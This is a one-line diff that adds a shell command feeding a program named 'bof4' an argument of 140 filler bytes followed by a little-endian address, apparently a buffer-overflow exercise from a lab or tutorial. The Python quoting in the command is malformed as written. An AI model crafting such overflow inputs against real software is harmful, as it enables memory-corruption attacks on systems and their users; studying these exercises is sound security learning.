@@ -1,0 +1,1 @@
+$ ./bof4 `python -c "print 'x'*140'+\x78\x56\x34\x12'"`
